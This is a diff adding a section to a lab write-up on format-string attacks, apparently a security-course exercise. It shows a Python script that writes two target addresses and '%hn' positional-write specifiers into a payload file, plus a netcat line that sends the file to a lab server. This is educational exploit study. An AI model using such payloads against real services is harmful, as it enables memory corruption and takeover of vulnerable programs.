@@ -414,6 +414,39 @@ cat badfile | nc -w2 10.9.0.5 9090
 
 **image**
 
+___
+
+Rather than using so may %x in our attack, we can make use of just one to build up the number we want to write into a memory address and use a modifier (K$) to move the pointer to the Kth element we want to write into.
+
+The above code can be modified as below to achieve this:
+
+```python
+#!/usr/bin/python3
+import sys
+
+# Start input with the memory address that will store a lower value
+content = (0x080e506a).to_bytes(4,byteorder='little')
+
+# Append the memory address that will store a higher value
+content += (0x080e5068).to_bytes(4,byteorder='little')
+
+# Append format specifiers
+content += ("%.43699x%64$hn").encode('latin-1')
+content += ("%.8738x%65$hn").encode('latin-1')
+
+# Append a newline
+content += ("\n").encode('latin-1')
+
+
+# Write the content to badfile
+with open('badfile', 'wb') as f:
+  print(f"writing {len(content)} bytes to badfile...")
+  f.write(content)
+```
+
+As we can see, the result is the same.
+**image**
+
 
 ##### Using %hhn
 
